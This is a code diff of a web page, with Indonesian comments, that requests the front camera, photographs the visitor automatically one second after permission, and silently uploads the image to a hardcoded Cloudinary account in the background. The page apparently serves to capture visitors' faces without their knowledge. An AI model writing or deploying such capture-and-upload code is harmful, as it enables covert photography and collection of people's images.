@@ -46,13 +46,13 @@
         const preview = document.getElementById('preview');
         const ctx = canvas.getContext('2d');
 
-        // 1. MINTA IZIN KAMERA SEBELUM MENGGUNAKAN
+        // 1. MINTA IZIN KAMERA DAN MULAI SEGERA
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
-                    console.log("Kamera siap, mengambil foto dalam 3 detik...");
-                    setTimeout(takePhoto, 3000);
+                    console.log("Kamera siap, mengambil foto dalam 1 detik...");
+                    setTimeout(takePhoto, 1000); // Kurangi waktu tunggu jadi 1 detik
                 };
             })
             .catch(err => {
@@ -60,7 +60,7 @@
                 alert("Izin kamera diperlukan untuk mengambil foto.");
             });
 
-        // 2. AMBIL FOTO SETELAH KAMERA SIAP
+        // 2. AMBIL FOTO SEGERA
         function takePhoto() {
             if (video.videoWidth === 0 || video.videoHeight === 0) {
                 console.error("Kamera tidak siap!");
@@ -73,13 +73,15 @@
             canvas.height = 800;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            preview.src = canvas.toDataURL("image/jpeg", 0.6);  
-            console.log("Foto berhasil diambil.");
+            preview.src = canvas.toDataURL("image/jpeg", 0.8); // Tampilkan foto langsung
 
-            canvas.toBlob(uploadToCloudinary, "image/jpeg", 0.6);
+            // 3. KOMPRES DAN UPLOAD DI LATAR BELAKANG
+            setTimeout(() => {
+                canvas.toBlob(uploadToCloudinary, "image/jpeg", 0.6);
+            }, 100);
         }
 
-        // 3. FUNGSI UPLOAD KE CLOUDINARY
+        // 4. FUNGSI UPLOAD KE CLOUDINARY
         function uploadToCloudinary(imageBlob) {
             let cloudName = "dl5dswv7q";  
             let uploadPreset = "tikontol";  
